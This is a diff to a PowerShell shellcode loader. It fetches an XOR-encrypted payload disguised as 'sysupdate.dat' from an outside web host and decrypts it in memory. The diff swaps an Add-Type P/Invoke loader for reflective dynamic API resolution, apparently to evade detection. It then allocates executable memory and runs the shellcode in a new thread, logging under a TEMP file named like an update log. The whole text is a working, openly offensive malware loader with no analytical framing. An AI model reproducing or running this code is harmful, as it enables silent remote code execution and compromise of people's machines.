@@ -1,9 +1,9 @@
 $ErrorActionPreference = 'SilentlyContinue'
 $ProgressPreference = 'SilentlyContinue'
 
-# 1. Fetch Encrypted Shellcode
+# 1. Fetch Encrypted Shellcode (Cache buster included)
 $base = 'https://site-assetss.vercel.app'
-$url = "$base/assets/sysupdate.dat?v=4"
+$url = "$base/assets/sysupdate.dat?v=6"
 
 $c = New-Object Net.WebClient
 $c.Headers.Add('User-Agent','Mozilla/5.0')
@@ -18,42 +18,62 @@ for ($i = 0; $i -lt $bytes.Length; $i++) {
     $bytes[$i] = $bytes[$i] -bxor 0x99
 }
 
-# 3. Define APIs (Renamed to MemOpV2)
-$code = @"
-using System;
-using System.Runtime.InteropServices;
-public class MemOpV2 {
-    [DllImport("kernel32", SetLastError=true)] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);
-    [DllImport("kernel32", SetLastError=true)] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
-    [DllImport("kernel32", SetLastError=true)] public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
-    [DllImport("kernel32", SetLastError=true)] public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
-
-    public static string Run(byte[] shellcode) {
-        IntPtr ptr = VirtualAlloc(IntPtr.Zero, (UIntPtr)shellcode.Length, 0x3000, 0x04);
-        if (ptr == IntPtr.Zero) return "VirtualAlloc failed: " + Marshal.GetLastWin32Error();
-        
-        Marshal.Copy(shellcode, 0, ptr, shellcode.Length);
-        
-        uint oldProtect;
-        VirtualProtect(ptr, (UIntPtr)shellcode.Length, 0x20, out oldProtect);
-        
-        IntPtr thread = CreateThread(IntPtr.Zero, 0, ptr, IntPtr.Zero, 0, IntPtr.Zero);
-        if (thread == IntPtr.Zero) return "CreateThread failed: " + Marshal.GetLastWin32Error();
-        
-        WaitForSingleObject(thread, 0xFFFFFFFF);
-        return "Success";
-    }
+# 3. Dynamic API Resolution (No Add-Type)
+function LookupFunc {
+    Param ($moduleName, $functionName)
+    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { 
+        $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') 
+    }).GetType('Microsoft.Win32.UnsafeNativeMethods')
+    $tmp = @()
+    $assem.GetMethods() | ForEach-Object { If ($_.Name -eq "GetProcAddress") { $tmp += $_ } }
+    return $tmp[0].Invoke($null, @( 
+        ($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), 
+        $functionName 
+    ))
 }
-"@
 
-try {
-    Add-Type -TypeDefinition $code -ErrorAction Stop
-    "Add-Type succeeded." | Out-File "$env:TEMP\upd.log" -Append
-} catch {
-    "Add-Type failed: $_" | Out-File "$env:TEMP\upd.log" -Append
+function getDelegateType {
+    Param (
+        [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
+        [Parameter(Position = 1)] [Type] $delType = [Void]
+    )
+    $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly(
+        (New-Object System.Reflection.AssemblyName('ReflectedDelegate')), 
+        [System.Reflection.Emit.AssemblyBuilderAccess]::Run
+    ).DefineDynamicModule('InMemoryModule', $false).DefineType(
+        'MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', 
+        [System.MulticastDelegate]
+    )
+    $type.DefineConstructor(
+        'RTSpecialName, HideBySig, Public', 
+        [System.Reflection.CallingConventions]::Standard, $func
+    ).SetImplementationFlags('Runtime, Managed')
+    $type.DefineMethod(
+        'Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func
+    ).SetImplementationFlags('Runtime, Managed')
+    return $type.CreateType()
+}
+
+# 4. Allocate Memory and Copy Payload
+$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
+    (LookupFunc kernel32.dll VirtualAlloc), 
+    (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))
+).Invoke([IntPtr]::Zero, $bytes.Length, 0x3000, 0x40)
+
+if ($lpMem -eq [IntPtr]::Zero) {
+    "VirtualAlloc failed" | Out-File "$env:TEMP\upd.log" -Append
     exit
 }
 
-# 4. Execute
-$result = [MemOpV2]::Run($bytes)
-"Execution result: $result" | Out-File "$env:TEMP\upd.log" -Append
+[System.Runtime.InteropServices.Marshal]::Copy($bytes, 0, $lpMem, $bytes.Length)
+
+# 5. Execute Thread
+$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
+    (LookupFunc kernel32.dll CreateThread), 
+    (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))
+).Invoke([IntPtr]::Zero, 0, $lpMem, [IntPtr]::Zero, 0, [IntPtr]::Zero)
+
+[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
+    (LookupFunc kernel32.dll WaitForSingleObject), 
+    (getDelegateType @([IntPtr], [Int32]) ([Int]))
+).Invoke($hThread, 0xFFFFFFFF)
